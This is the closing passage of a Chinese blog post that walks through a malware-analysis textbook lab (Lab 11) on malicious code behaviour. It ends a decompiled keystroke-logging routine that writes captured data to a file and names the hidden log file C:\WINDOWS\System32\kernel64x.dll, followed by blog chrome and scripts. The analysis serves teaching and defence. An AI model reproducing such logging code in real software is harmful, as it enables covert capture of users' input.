<span class="number">1032</span>);</span><br><span class="line">      WriteFile(*(HANDLE *)(a1 + <span class="number">2060</span>), &amp;Buffer, <span class="built_in">strlen</span>(&amp;Buffer), &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Sleep(<span class="number">0xA</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>6.这个恶意代码将收集的数据存放在何处？</strong></p>
+<p><code>C:\\WINDOWS\\System32\\kernel64x.dll</code></p>
+<h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持是我最大的动力🍉</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="Hvnt3r WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Hvnt3r Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    Hvnt3r
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://hvnt3r.top/2019/03/恶意代码行为/" title="恶意代码行为">https://hvnt3r.top/2019/03/恶意代码行为/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/恶意代码分析/" rel="tag"><i class="fa fa-tag"></i> 恶意代码分析</a>
+          
+            <a href="/tags/恶意行为分析/" rel="tag"><i class="fa fa-tag"></i> 恶意行为分析</a>
+          
+            <a href="/tags/特洛伊木马化技术/" rel="tag"><i class="fa fa-tag"></i> 特洛伊木马化技术</a>
+          
+            <a href="/tags/ShellCode植入/" rel="tag"><i class="fa fa-tag"></i> ShellCode植入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/使用WinDbg调试内核/" rel="next" title="使用WinDbg调试内核">
+                <i class="fa fa-chevron-left"></i> 使用WinDbg调试内核
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Hvnt3r" />
+            
+              <p class="site-author-name" itemprop="name">Hvnt3r</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Hvnt3r" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:hvnt3r@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#恶意代码行为"><span class="nav-number">1.</span> <span class="nav-text">恶意代码行为</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#知识点"><span class="nav-number">1.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#课后练习"><span class="nav-number">1.2.</span> <span class="nav-text">课后练习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab11-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">Lab11-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab11-2"><span class="nav-number">1.2.2.</span> <span class="nav-text">Lab11-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab11-3"><span class="nav-number">1.2.3.</span> <span class="nav-text">Lab11-3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本章结束🎊"><span class="nav-number">1.3.</span> <span class="nav-text">本章结束🎊</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Hvnt3r</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">72.9k</span>
+  
+</div>
+
+
+
+
+<!-- 
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("Mlz03BBADnvOzP0kDTeS9A4a-gzGzoHsz", "gbVyqV9usci1PKnM7hcg3uCv");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
